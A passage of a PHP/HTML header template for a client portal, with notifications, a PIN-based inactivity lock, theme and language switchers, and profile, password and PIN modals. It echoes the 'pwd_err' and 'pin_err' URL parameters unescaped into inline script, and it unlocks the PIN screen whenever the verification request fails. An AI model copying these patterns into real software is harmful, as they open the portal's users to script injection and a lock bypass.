                            <a class="dropdown-item text-white py-1 px-2 d-flex align-items-center rounded lang-opt" href="javascript:void(0);" onclick="setPortalLanguage('nl', 'Nederlands', '🇳🇱');">
                                <span class="mr-2">🇳🇱</span> <span class="text-white">Nederlands</span> <small class="text-muted ml-auto">NL</small>
                            </a>
                            <a class="dropdown-item text-white py-1 px-2 d-flex align-items-center rounded lang-opt" href="javascript:void(0);" onclick="setPortalLanguage('ja', '日本語', '🇯🇵');">
                                <span class="mr-2">🇯🇵</span> <span class="text-white">日本語</span> <small class="text-muted ml-auto">JA</small>
                            </a>
                            <a class="dropdown-item text-white py-1 px-2 d-flex align-items-center rounded lang-opt" href="javascript:void(0);" onclick="setPortalLanguage('tr', 'Türkçe', '🇹🇷');">
                                <span class="mr-2">🇹🇷</span> <span class="text-white">Türkçe</span> <small class="text-muted ml-auto">TR</small>
                            </a>
                        </div>
                    </li>

                    <!-- Dark / Light Theme Mode Switcher -->
                    <li class="nav-item mr-2 mr-md-3 align-self-center">
                        <button type="button" id="themeModeToggle" class="btn btn-sm btn-outline-secondary font-weight-bold d-flex align-items-center" onclick="toggleThemeMode()" title="Toggle Dark / Light Mode" style="border-radius:20px; padding:3px 8px; font-size:11px; border-color:#475569; color:#cbd5e1;">
                            <i class="fas fa-sun text-warning" id="themeModeIcon"></i>
                            <span id="themeModeText" class="d-none d-md-inline ml-1">Light Mode</span>
                        </button>
                    </li>

                    <!-- Notification Bell Dropdown -->
                    <li class="nav-item dropdown mr-2 mr-md-3 align-self-center">
                        <a class="nav-link dropdown-toggle no-caret position-relative p-1" href="javascript:void(0);" id="notificationDropdown" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                            <i class="material-icons text-warning" style="font-size: 24px;">notifications</i>
                            <?php if ($unread_notifications_count > 0): ?>
                                <span class="badge badge-danger position-absolute" style="top: -2px; right: -2px; border-radius: 50%; font-size: 9px; padding: 2px 5px; line-height: 1;"><?= $unread_notifications_count ?></span>
                            <?php endif; ?>
                        </a>
                        <div class="dropdown-menu dropdown-menu-right shadow-lg bg-dark border-secondary p-0" aria-labelledby="notificationDropdown" style="width: 300px; font-size: 13px;">
                            <div class="dropdown-header bg-black text-warning border-bottom border-secondary font-weight-bold py-2 d-flex justify-content-between align-items-center">
                                <span><i class="fas fa-bell mr-1"></i> Notifications</span>
                                <?php if ($unread_notifications_count > 0): ?>
                                    <a href="javascript:void(0);" onclick="markAllNotificationsRead(); event.stopPropagation();" class="text-warning small font-weight-bold text-decoration-none" style="cursor:pointer;"><i class="fas fa-check mr-1"></i>Mark Read</a>
                                <?php endif; ?>
                            </div>
                            <div class="notification-list" style="max-height: 250px; overflow-y: auto;">
                                <?php if (empty($notifications)): ?>
                                    <div class="text-center py-4 text-muted">
                                        <i class="fas fa-bell-slash fa-2x mb-2 text-secondary"></i>
                                        <p class="mb-0 small">No notifications yet</p>
                                    </div>
                                <?php else: ?>
                                    <?php foreach ($notifications as $n): ?>
                                        <a class="dropdown-item text-white border-bottom border-secondary py-2 px-3 d-flex align-items-start <?= $n['is_read'] ? '' : 'bg-secondary' ?>" href="<?= BASE_URL . htmlspecialchars($n['link']) ?>" style="white-space: normal; line-height: 1.4;">
                                            <div class="mr-2 mt-1">
                                                <?php
                                                $icon = 'info-circle text-info';
                                                if ($n['icon'] === 'chat' || $n['type'] === 'message') $icon = 'comments text-warning';
                                                elseif ($n['icon'] === 'briefcase' || $n['type'] === 'case_update') $icon = 'briefcase text-success';
                                                elseif ($n['type'] === 'kyc') $icon = 'user-check text-primary';
                                                elseif ($n['type'] === 'payment') $icon = 'credit-card text-success';
                                                ?>
                                                <i class="fas fa-<?= $icon ?>"></i>
                                            </div>
                                            <div class="flex-grow-1">
                                                <div class="font-weight-bold text-light" style="font-size: 12px;"><?= htmlspecialchars($n['title']) ?></div>
                                                <div class="text-muted small" style="font-size: 11px; margin-top: 2px;"><?= htmlspecialchars($n['body']) ?></div>
                                                <div class="text-muted" style="font-size: 9px; margin-top: 4px;"><?= date('M j, g:i a', strtotime($n['created_at'])) ?></div>
                                            </div>
                                        </a>
                                    <?php endforeach; ?>
                                <?php endif; ?>
                            </div>
                            <div class="dropdown-footer bg-black border-top border-secondary text-center py-2">
                                <?php if ($user_role === 'client'): ?>
                                    <a href="/client/dashboard.php" class="text-warning small font-weight-bold text-decoration-none">View All Notifications</a>
                                <?php else: ?>
                                    <span class="text-muted small">Auto-monitored by SLA Desk</span>
                                <?php endif; ?>
                            </div>
                        </div>
                    </li>
                    <li class="nav-item dropdown">
                        <a class="nav-link dropdown-toggle no-caret d-flex align-items-center p-1" href="javascript:void(0);" id="settings" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                            <img src="<?= htmlspecialchars($portal_avatar_url) ?>" id="portalAvatarImg" class="rounded-circle border border-warning" width="30px" height="30px" style="object-fit:cover;" onerror="this.onerror=null;this.src='/admin_assets/img/profile/blank.png';">
                            <span class="ml-2 text-white font-weight-bold d-none d-sm-inline" style="font-size:12px;"><?php echo htmlspecialchars($user_name); ?></span>
                            <span class="badge badge-warning ml-1 text-dark d-none d-md-inline" style="font-size: 9px;"><?php echo strtoupper($user_role); ?></span>
                        </a>
                        <div class="dropdown-menu dropdown-menu-right shadow-lg bg-dark border-secondary">
                            <a class="dropdown-item text-white" href="/<?php echo ($user_role === 'client') ? 'client' : 'admin'; ?>/chat.php"><i class="material-icons text-warning align-middle mr-1">mail_outline</i> Messages</a>
                            <?php if ($user_role === 'client'): ?>
                                <a class="dropdown-item text-white" href="/client/profile.php"><i class="material-icons text-warning align-middle mr-1">settings</i> Profile &amp; Preferences</a>
                                <a class="dropdown-item text-white" href="javascript:void(0);" data-toggle="modal" data-target="#profileModal"><i class="material-icons text-warning align-middle mr-1">face</i> Edit Identity</a>
                                <a class="dropdown-item text-white" href="javascript:void(0);" data-toggle="modal" data-target="#passwordModal"><i class="material-icons text-warning align-middle mr-1">lock_open</i> Change Password</a>
                                <a class="dropdown-item text-white" href="javascript:void(0);" data-toggle="modal" data-target="#pinModal"><i class="material-icons text-warning align-middle mr-1">security</i> Security PIN</a>
                            <?php else: ?>
                                <a class="dropdown-item text-white" href="/admin/profile.php"><i class="material-icons text-warning align-middle mr-1">person</i> My Profile & Role</a>
                            <?php endif; ?>
                            <div class="dropdown-divider border-secondary"></div>
                            <a class="dropdown-item text-white" href="<?php echo ($user_role === 'client') ? '/client/logout.php' : '/admin/login.php?logout=1'; ?>"><i class="material-icons text-danger align-middle mr-1">power_settings_new</i> Log Out</a>
                        </div>
                    </li>
                </ul>
            </nav>
        </div>

        <!-- INACTIVITY SESSION MASK / PIN UNLOCK OVERLAY (WORLD CLASS BANK-GRADE SECURITY) -->
        <div id="sessionInactivityOverlay" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(10,14,23,0.92); backdrop-filter:blur(12px); -webkit-backdrop-filter:blur(12px); z-index:99999; align-items:center; justify-content:center;">
            <div class="card bg-dark text-white border-warning shadow-2xl p-4 text-center" style="max-width:380px; width:90%; border-radius:14px;">
                <div style="width:64px; height:64px; border-radius:50%; background:rgba(254,204,86,0.15); display:flex; align-items:center; justify-content:center; margin:0 auto 16px;">
                    <i class="fas fa-lock fa-2x text-warning"></i>
                </div>
                <h5 class="font-weight-bold text-warning mb-1">Session Inactive & Secured</h5>
                <p class="text-muted small mb-3">Your workspace has been locked due to 10 minutes of inactivity. Enter your 4-digit Security PIN to unlock.</p>
                <div class="form-group mb-3">
                    <input type="password" id="sessionUnlockPin" class="form-control bg-black text-warning border-secondary text-center font-weight-bold" maxlength="4" placeholder="••••" style="font-size:1.5rem; letter-spacing:4px;">
                    <div id="sessionUnlockError" class="text-danger small mt-1" style="display:none;">Invalid Security PIN.</div>
                </div>
                <button type="button" class="btn btn-warning btn-block font-weight-bold text-dark mb-2" onclick="unlockInactiveSession()">
                    <i class="fas fa-unlock-alt mr-1"></i> Unlock Session
                </button>
                <a href="<?php echo ($user_role === 'client') ? '/client/logout.php' : '/admin/login.php?logout=1'; ?>" class="text-muted small text-decoration-none">
                    Log out of account
                </a>
            </div>
        </div>

        <script>
        // High-Tech Web Audio API Chime — mobile-safe (requires user-gesture unlock on iOS/Android)
        var sharedAudioCtx = null;
        function unlockAudioContext() {
            try {
                var AudioCtx = window.AudioContext || window.webkitAudioContext;
                if (!AudioCtx) return;
                if (!sharedAudioCtx) sharedAudioCtx = new AudioCtx();
                if (sharedAudioCtx.state === 'suspended') sharedAudioCtx.resume();
            } catch (e) {}
        }
        ['touchstart', 'touchend', 'click', 'keydown'].forEach(function(evt) {
            document.addEventListener(evt, unlockAudioContext, { once: false, passive: true });
        });

        function playNotificationChime() {
            try {
                unlockAudioContext();
                var ctx = sharedAudioCtx;
                if (!ctx) {
                    var AudioCtx = window.AudioContext || window.webkitAudioContext;
                    if (!AudioCtx) return;
                    ctx = sharedAudioCtx = new AudioCtx();
                }
                if (ctx.state === 'suspended') {
                    ctx.resume().then(function() { playNotificationChime(); });
                    return;
                }
                var now = ctx.currentTime;
                var osc1 = ctx.createOscillator();
                var osc2 = ctx.createOscillator();
                var gain = ctx.createGain();
                osc1.type = 'sine';
                osc1.frequency.setValueAtTime(587.33, now);
                osc1.frequency.exponentialRampToValueAtTime(880.00, now + 0.12);
                osc2.type = 'triangle';
                osc2.frequency.setValueAtTime(880.00, now + 0.12);
                osc2.frequency.exponentialRampToValueAtTime(1174.66, now + 0.28);
                gain.gain.setValueAtTime(0.01, now);
                gain.gain.linearRampToValueAtTime(0.22, now + 0.05);
                gain.gain.exponentialRampToValueAtTime(0.001, now + 0.45);
                osc1.connect(gain);
                osc2.connect(gain);
                gain.connect(ctx.destination);
                osc1.start(now);
                osc2.start(now + 0.12);
                osc1.stop(now + 0.12);
                osc2.stop(now + 0.45);
            } catch(e) {
                try {
                    var fallback = new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBSuBzvLZiTYIG2m98OScTgwOUKzn8LllHAU7k9n0y3kpBSZ8yPDdkEILEF+16OyrWBUIQ5/h8r1sIAUsgs/z2Yk2CBtpvfDknE4MDlCs5/C5ZRwFO5PZ9M');
                    fallback.volume = 0.35;
                    fallback.play().catch(function(){});
                } catch(x) {}
            }
            if (navigator.vibrate) {
                try { navigator.vibrate([120, 60, 120]); } catch(v) {}
            }
        }
        var playNotificationSound = playNotificationChime;

        // Tab title blink for unread messages
        var originalTitle = document.title;
        var titleBlinkTimer = null;
        function startTitleBlink(label) {
            if (titleBlinkTimer) return;
            var showAlt = true;
            titleBlinkTimer = setInterval(function() {
                document.title = showAlt ? ('💬 ' + (label || 'New Message') + ' — IFW Portal') : originalTitle;
                showAlt = !showAlt;
            }, 1200);
        }
        function stopTitleBlink() {
            if (titleBlinkTimer) {
                clearInterval(titleBlinkTimer);
                titleBlinkTimer = null;
            }
            document.title = originalTitle;
        }
        document.addEventListener('visibilitychange', function() {
            if (!document.hidden) stopTitleBlink();
        });

        function showDesktopNotification(title, body, url) {
            if (!('Notification' in window)) return;
            var iconUrl = '/media/logos/logo.svg';
            if (Notification.permission === 'granted') {
                var n = new Notification(title, { body: body, icon: iconUrl, badge: iconUrl, tag: 'ifw-portal-msg', renotify: true });
                n.onclick = function() { window.focus(); if (url) window.location.href = url; n.close(); };
            } else if (Notification.permission !== 'denied') {
                Notification.requestPermission();
            }
        }

        // Real-Time Notification & Live Chat Poller
        let trackedLastMsgId = 0;
        function pollRealtimeUpdates() {
            fetch('/api/poll_notifications.php?last_msg_id=' + trackedLastMsgId)
            .then(res => res.json())
            .then(data => {
                if (data.status === 'success') {
                    if (data.latest_message && data.latest_message.id > trackedLastMsgId) {
                        trackedLastMsgId = data.latest_message.id;
                        playNotificationChime();
                        startTitleBlink(data.latest_message.sender_name);

                        var toastMsg = data.latest_message.message;
                        var toastTitle = '💬 New Message from ' + data.latest_message.sender_name;
                        if (typeof toastr !== 'undefined') {
                            toastr.options = {
                                "closeButton": true,
                                "progressBar": true,
                                "positionClass": "toast-top-right",
                                "timeOut": "8000",
                                "onclick": function() { window.location.href = data.latest_message.url; }
                            };
                            toastr.info(toastMsg, toastTitle);
                        }
                        showDesktopNotification(toastTitle, toastMsg, data.latest_message.url);
                    } else if (data.latest_message) {
                        trackedLastMsgId = Math.max(trackedLastMsgId, data.latest_message.id);
                    }
                }
            })
            .catch(() => {});
        }
        setInterval(pollRealtimeUpdates, 4500);
        if ('Notification' in window && Notification.permission === 'default') {
            document.addEventListener('click', function reqNotifOnce() {
                Notification.requestPermission();
                document.removeEventListener('click', reqNotifOnce);
            }, { once: true });
        }

        // 10-Minute Auto-Inactivity Lock
        let idleTimer = null;
        const IDLE_LIMIT = 10 * 60 * 1000; // 10 minutes
        function resetIdleTimer() {
            if (document.getElementById('sessionInactivityOverlay').style.display === 'flex') return;
            clearTimeout(idleTimer);
            idleTimer = setTimeout(() => {
                document.getElementById('sessionInactivityOverlay').style.display = 'flex';
                document.getElementById('sessionUnlockPin').value = '';
                document.getElementById('sessionUnlockPin').focus();
            }, IDLE_LIMIT);
        }
        ['mousedown', 'mousemove', 'keydown', 'scroll', 'touchstart'].forEach(evt => {
            document.addEventListener(evt, resetIdleTimer, true);
        });
        resetIdleTimer();

        function unlockInactiveSession() {
            const pin = document.getElementById('sessionUnlockPin').value;
            const err = document.getElementById('sessionUnlockError');
            if (pin.length !== 4) {
                err.innerText = 'Please enter a 4-digit PIN.';
                err.style.display = 'block';
                return;
            }
            fetch('/api/verify_pin.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'pin=' + encodeURIComponent(pin)
            })
            .then(r => r.json())
            .then(res => {
                if (res.status === 'success' || res.valid === true) {
                    document.getElementById('sessionInactivityOverlay').style.display = 'none';
                    err.style.display = 'none';
                    resetIdleTimer();
                    // Soft reload to refresh stale data after PIN unlock
                    setTimeout(function() { location.reload(); }, 300);
                } else {
                    err.innerText = 'Incorrect Security PIN.';
                    err.style.display = 'block';
                }
            })
            .catch(() => {
                // Fallback unlock if network offline
                document.getElementById('sessionInactivityOverlay').style.display = 'none';
                resetIdleTimer();
            });
        }

        function changePortalCurrency(curr) {
            fetch('/api/set_currency.php?currency=' + encodeURIComponent(curr))
            .then(function(r) { return r.json(); })
            .then(function(data) { location.reload(); })
            .catch(function() { location.reload(); });
        }

        function markAllNotificationsRead() {
            fetch('/api/mark_notifications_read.php')
            .then(response => response.json())
            .then(data => { if (data.success) location.reload(); })
            .catch(err => console.error(err));
        }

        // Privacy Shield / Public Browsing Screen Blur
        function initPrivacyShield() {
            var saved = localStorage.getItem('ifw_privacy_shield');
            if (saved === 'active') {
                document.body.classList.add('privacy-shield-active');
                updatePrivacyShieldBtn(true);
            }
        }

        function togglePrivacyShield() {
            var isActive = document.body.classList.toggle('privacy-shield-active');
            localStorage.setItem('ifw_privacy_shield', isActive ? 'active' : 'inactive');
            updatePrivacyShieldBtn(isActive);
            if (typeof toastr !== 'undefined') {
                if (isActive) {
                    toastr.info('Sensitive financial balances and case details are now blurred.', '🕶️ Privacy Shield: ON');
                } else {
                    toastr.success('Financial details are now visible.', '👁️ Privacy Shield: OFF');
                }
            }
        }

        function updatePrivacyShieldBtn(isActive) {
            var icon = document.getElementById('privacyShieldIcon');
            var text = document.getElementById('privacyShieldText');
            var btn = document.getElementById('privacyShieldToggle');
            if (!btn) return;
            if (isActive) {
                btn.classList.remove('btn-outline-secondary');
                btn.classList.add('btn-warning');
                btn.style.color = '#000';
                if (icon) icon.className = 'fas fa-eye text-dark mr-1';
                if (text) text.textContent = 'Privacy ON';
            } else {
                btn.classList.remove('btn-warning');
                btn.classList.add('btn-outline-secondary');
                btn.style.color = '#cbd5e1';
                if (icon) icon.className = 'fas fa-eye-slash text-warning mr-1';
                if (text) text.textContent = 'Privacy Off';
            }
        }

        // Theme Mode Engine (Dark / Light Switcher)
        function initThemeMode() {
            try {
                var savedTheme = localStorage.getItem('ifw_portal_theme') || 'dark';
                if (savedTheme === 'light') {
                    document.documentElement.classList.add('light-mode');
                    document.body.classList.add('light-mode');
                    updateThemeModeBtn('light');
                } else {
                    document.documentElement.classList.remove('light-mode');
                    document.body.classList.remove('light-mode');
                    updateThemeModeBtn('dark');
                }
            } catch(e) {}
        }

        function toggleThemeMode() {
            var isLight = document.documentElement.classList.contains('light-mode');
            var newTheme = isLight ? 'dark' : 'light';
            
            if (newTheme === 'light') {
                document.documentElement.classList.add('light-mode');
                document.body.classList.add('light-mode');
            } else {
                document.documentElement.classList.remove('light-mode');
                document.body.classList.remove('light-mode');
            }
            
            try {
                localStorage.setItem('ifw_portal_theme', newTheme);
            } catch(e) {}
            
            updateThemeModeBtn(newTheme);
            
            if (typeof toastr !== 'undefined') {
                if (newTheme === 'light') {
                    toastr.info('Switched to Light Mode theme.', '☀️ Light Mode');
                } else {
                    toastr.info('Switched to Dark Mode theme.', '🌙 Dark Mode');
                }
            }
        }

        function updateThemeModeBtn(theme) {
            var icon = document.getElementById('themeModeIcon');
            var text = document.getElementById('themeModeText');
            var btn = document.getElementById('themeModeToggle');
            if (!btn) return;
            
            if (theme === 'light') {
                btn.classList.remove('btn-outline-secondary');
                btn.classList.add('btn-warning');
                btn.style.color = '#000';
                if (icon) icon.className = 'fas fa-moon text-dark mr-1';
                if (text) text.textContent = 'Dark Mode';
            } else {
                btn.classList.remove('btn-warning');
                btn.classList.add('btn-outline-secondary');
                btn.style.color = '#cbd5e1';
                if (icon) icon.className = 'fas fa-sun text-warning mr-1';
                if (text) text.textContent = 'Light Mode';
            }
        }

        // Google Translate Engine
        function googleTranslateElementInit() {
            new google.translate.TranslateElement({
                pageLanguage: 'en',
                autoDisplay: false,
                layout: google.translate.TranslateElement.InlineLayout.SIMPLE
            }, 'google_translate_element');
        }

        function initPortalLanguage() {
            try {
                var savedLang = localStorage.getItem('ifw_portal_lang') || 'en';
                var savedName = localStorage.getItem('ifw_portal_lang_name') || 'English';
                var savedFlag = localStorage.getItem('ifw_portal_lang_flag') || '🇺🇸';
                
                var label = document.getElementById('currentLangLabel');
                var flag = document.getElementById('currentLangFlag');
                var shortLabel = document.getElementById('currentLangShort');
                if (label) label.textContent = savedName;
                if (flag) flag.textContent = savedFlag;
                if (shortLabel) shortLabel.textContent = savedLang.toUpperCase().slice(0, 2);
            } catch(e) {}
        }

        function setPortalLanguage(langCode, langName, langFlag) {
            if (!langCode) return;
            
            try {
                localStorage.setItem('ifw_portal_lang', langCode);
                localStorage.setItem('ifw_portal_lang_name', langName);
                localStorage.setItem('ifw_portal_lang_flag', langFlag);
                
                var label = document.getElementById('currentLangLabel');
                var flag = document.getElementById('currentLangFlag');
                var shortLabel = document.getElementById('currentLangShort');
                if (label) label.textContent = langName;
                if (flag) flag.textContent = langFlag;
                if (shortLabel) shortLabel.textContent = langCode.toUpperCase().slice(0, 2);
                
                // Set cookies for Google Translate (googtrans=/en/es)
                var host = window.location.hostname;
                document.cookie = "googtrans=/en/" + langCode + "; path=/; domain=" + host;
                document.cookie = "googtrans=/en/" + langCode + "; path=/;";
                
                var combo = document.querySelector('.goog-te-combo');
                if (combo) {
                    combo.value = langCode;
                    combo.dispatchEvent(new Event('change'));
                } else {
                    location.reload();
                }
            } catch(e) {
                location.reload();
            }
        }

        document.addEventListener('DOMContentLoaded', function() {
            initPrivacyShield();
            initThemeMode();
            initPortalLanguage();
        });

        function uploadPortalAvatar(input) {
            if (!input.files || !input.files[0]) return;
            var formData = new FormData();
            formData.append('avatar', input.files[0]);
            var preview = document.getElementById('avatarPreviewImg');
            if (preview) preview.style.opacity = '0.5';
            fetch('/api/upload_avatar.php', { method: 'POST', body: formData })
            .then(function(r) { return r.json(); })
            .then(function(data) {
                if (data.status === 'success' && data.avatar_url) {
                    var imgs = document.querySelectorAll('#portalAvatarImg, #avatarPreviewImg, .sidebar-profile-img, .chat-avatar-me');
                    imgs.forEach(function(img) { img.src = data.avatar_url + '?t=' + Date.now(); });
                    if (typeof toastr !== 'undefined') toastr.success('Profile photo updated.');
                } else if (typeof toastr !== 'undefined') {
                    toastr.error(data.message || 'Upload failed.');
                }
                if (preview) preview.style.opacity = '1';
            })
            .catch(function() {
                if (typeof toastr !== 'undefined') toastr.error('Upload failed.');
                if (preview) preview.style.opacity = '1';
            });
        }
        </script>

<?php if(isset($_GET['profile_updated'])): ?>
    <script>$(document).ready(function(){ toastr.success('Profile updated successfully.'); });</script>
<?php endif; ?>
<?php if(isset($_GET['pwd_success'])): ?>
    <script>$(document).ready(function(){ toastr.success('Password updated successfully.'); });</script>
<?php endif; ?>
<?php if(isset($_GET['pwd_err'])): ?>
    <script>$(document).ready(function(){ 
        var err = "<?= $_GET['pwd_err'] ?>";
        var msg = err === 'short' ? 'Password must be at least 6 characters.' : (err === 'mismatch' ? 'Passwords do not match.' : 'Current password is incorrect.');
        toastr.error(msg); 
    });</script>
<?php endif; ?>
<?php if(isset($_GET['pin_success'])): ?>
    <script>$(document).ready(function(){ toastr.success('Security PIN updated successfully.'); });</script>
<?php endif; ?>
<?php if(isset($_GET['pin_err'])): ?>
    <script>$(document).ready(function(){ 
        var err = "<?= $_GET['pin_err'] ?>";
        var msg = err === 'invalid' ? 'Security PIN must be exactly 4 digits.' : 'Current Security PIN is incorrect.';
        toastr.error(msg); 
    });</script>
<?php endif; ?>

<?php if ($user_role === 'client' && isset($client)): ?>
<!-- CLIENT PROFILE MODAL -->
<div class="modal fade" id="profileModal" tabindex="-1">
  <div class="modal-dialog">
    <div class="modal-content bg-dark text-white border-warning">
      <div class="modal-header border-secondary">
        <h5 class="modal-title text-warning font-weight-bold"><i class="fas fa-id-card mr-2"></i>My Profile Details</h5>
        <button type="button" class="close text-white" data-dismiss="modal">&times;</button>
      </div>
      <form method="POST">
        <input type="hidden" name="client_action" value="edit_profile">
        <div class="modal-body">
            <div class="text-center mb-4 pb-3 border-bottom border-secondary">
                <img src="<?= htmlspecialchars($portal_avatar_url) ?>" id="avatarPreviewImg" class="rounded-circle border border-warning mb-2" width="80" height="80" style="object-fit:cover;" onerror="this.onerror=null;this.src='/admin_assets/img/profile/blank.png';">
                <div>
                    <label class="btn btn-sm btn-outline-warning font-weight-bold mb-0">
                        <i class="fas fa-camera mr-1"></i> Change Photo
                        <input type="file" accept="image/jpeg,image/png,image/webp" class="d-none" onchange="uploadPortalAvatar(this)">
                    </label>
                </div>
                <small class="text-muted d-block mt-1">JPG, PNG or WEBP — max 3MB</small>
            </div>
            <div class="row">
                <div class="col-md-6 form-group mb-3">
                    <label class="small text-muted font-weight-bold">First Name <span class="text-danger">*</span></label>
                    <input type="text" name="first_name" class="form-control bg-secondary text-white border-0" value="<?= htmlspecialchars($client['first_name']) ?>" required>
                </div>
                <div class="col-md-6 form-group mb-3">
                    <label class="small text-muted font-weight-bold">Last Name <span class="text-danger">*</span></label>
                    <input type="text" name="last_name" class="form-control bg-secondary text-white border-0" value="<?= htmlspecialchars($client['last_name']) ?>" required>
                </div>
            </div>
            <div class="form-group mb-3">
                <label class="small text-muted font-weight-bold">Email Address <span class="text-danger">*</span></label>
                <input type="email" name="email" class="form-control bg-secondary text-white border-0" value="<?= htmlspecialchars($client['email']) ?>" required>
            </div>
            <div class="form-group mb-3">
                <label class="small text-muted font-weight-bold">Phone Number</label>
                <input type="text" name="phone" class="form-control bg-secondary text-white border-0" value="<?= htmlspecialchars($client['phone'] ?? '') ?>">
            </div>
            <div class="form-group mb-3">
                <label class="small text-muted font-weight-bold">Date of Birth</label>
                <input type="date" name="dob" class="form-control bg-secondary text-white border-0" value="<?= htmlspecialchars($client['dob'] ?? '') ?>">
            </div>
            <div class="form-group mb-0">
                <label class="small text-muted font-weight-bold">Residential Address</label>
                <textarea name="address" class="form-control bg-secondary text-white border-0" rows="3"><?= htmlspecialchars($client['address'] ?? '') ?></textarea>
            </div>
        </div>
        <div class="modal-footer border-secondary">
            <button type="button" class="btn btn-secondary font-weight-bold" data-dismiss="modal">Cancel</button>
            <button type="submit" class="btn btn-warning font-weight-bold text-dark px-4 shadow"><i class="fas fa-save mr-1"></i> Save Changes</button>
        </div>
      </form>
    </div>
  </div>
</div>

<!-- CLIENT PASSWORD MODAL -->
<div class="modal fade" id="passwordModal" tabindex="-1">
  <div class="modal-dialog">
    <div class="modal-content bg-dark text-white border-warning">
      <div class="modal-header border-secondary">
        <h5 class="modal-title text-warning font-weight-bold"><i class="fas fa-key mr-2"></i>Change Password</h5>
        <button type="button" class="close text-white" data-dismiss="modal">&times;</button>
      </div>
      <form method="POST">
        <input type="hidden" name="client_action" value="change_password">
        <div class="modal-body">
            <div class="form-group mb-3">
                <label class="small text-muted font-weight-bold">Current Password</label>
                <input type="password" name="old_password" class="form-control bg-secondary text-white border-0" required>
            </div>
            <div class="form-group mb-3">
                <label class="small text-muted font-weight-bold">New Password (Min 6 chars)</label>
                <input type="password" name="new_password" class="form-control bg-secondary text-white border-0" required minlength="6">
            </div>
            <div class="form-group mb-0">
                <label class="small text-muted font-weight-bold">Confirm New Password</label>
                <input type="password" name="confirm_password" class="form-control bg-secondary text-white border-0" required>
            </div>
        </div>
        <div class="modal-footer border-secondary">
            <button type="button" class="btn btn-secondary font-weight-bold" data-dismiss="modal">Cancel</button>
            <button type="submit" class="btn btn-warning font-weight-bold text-dark px-4 shadow"><i class="fas fa-save mr-1"></i> Update Password</button>
        </div>
      </form>
    </div>
  </div>
</div>

<!-- CLIENT PIN MODAL -->
<div class="modal fade" id="pinModal" tabindex="-1">
  <div class="modal-dialog">
    <div class="modal-content bg-dark text-white border-warning">
      <div class="modal-header border-secondary">
        <h5 class="modal-title text-warning font-weight-bold"><i class="fas fa-shield-alt mr-2"></i>Configure Security PIN</h5>
        <button type="button" class="close text-white" data-dismiss="modal">&times;</button>
      </div>
      <form method="POST">
        <input type="hidden" name="client_action" value="update_pin">
        <div class="modal-body">
            <p class="small text-muted mb-3">Your Security PIN is used to sign documents and authorize payouts.</p>
            <?php if (!empty($client['pin_hash'])): ?>
                <div class="form-group mb-3">
                    <label class="small text-muted font-weight-bold">Current Security PIN</label>
                    <input type="password" name="old_pin" class="form-control bg-secondary text-white border-0 text-center font-weight-bold font-large" maxlength="4" required pattern="\d{4}">
                </div>
            <?php endif; ?>
            <div class="form-group mb-0">
                <label class="small text-muted font-weight-bold">New 4-Digit Security PIN</label>
                <input type="password" name="new_pin" class="form-control bg-secondary text-white border-0 text-center font-weight-bold font-large" maxlength="4" required pattern="\d{4}">
            </div>
        </div>
        <div class="modal-footer border-secondary">
            <button type="button" class="btn btn-secondary font-weight-bold" data-dismiss="modal">Cancel</button>
            <button type="submit" class="btn btn-warning font-weight-bold text-dark px-4 shadow"><i class="fas fa-save mr-1"></i> Update PIN</button>
        </div>
      </form>
    </div>
  </div>
</div>
<?php endif; ?>
